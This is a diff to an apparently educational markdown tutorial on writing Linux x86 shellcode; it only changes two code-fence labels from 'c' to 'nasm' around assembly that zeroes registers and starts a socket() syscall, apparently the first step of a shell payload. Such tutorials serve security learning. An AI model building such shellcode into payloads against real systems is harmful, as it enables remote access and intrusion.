@@ -92,7 +92,7 @@ Beautiful! Now let's get started with recreating the payload in ASM.
 ## Creating the assembly program
 The first set of instructions are almost always the same which is clearing the register sets we will be using in our program.
 
-```c
+```nasm
 ; Clearing the first 4 registers for 1st Syscall - socket()
 
 xor eax, eax       ; May also sub OR mul for zeroing out
@@ -106,7 +106,7 @@ Note that we didn't use XOR'ing for clearing the EDX register instead we used cd
 
 Now we will initiate the socket syscall using the good ol' software interrupt 80h.
 
-```c
+```nasm
 ; Syscall value for socket() = 359 OR 0x167, loading it in AX
 mov ax, 0x167
 ; Loading 2 in BL for AF_INET - 1st argument for socket()
